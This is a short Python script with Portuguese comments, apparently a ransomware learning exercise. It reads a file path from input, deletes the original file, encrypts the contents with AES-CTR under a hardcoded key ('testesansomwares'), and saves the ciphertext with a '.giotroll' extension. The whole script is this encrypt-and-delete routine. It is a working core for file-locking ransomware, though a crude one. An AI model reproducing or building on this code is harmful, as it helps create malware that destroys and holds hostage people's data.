import os
import pyaes

## Instalando Biblioteca

## os.system('pip install --upgrade')
## os.system('exit')

## abrindo arquivo

file_name = input('Digite o diretorio/nome do arquivo : ')
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## Remover o arquivo

os.remove(file_name)

## Definindo chave
key = b'testesansomwares'
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar arquivo

crypto_data = aes.encrypt(file_data)

## salva arquivo

new_file = file_name + '.giotroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
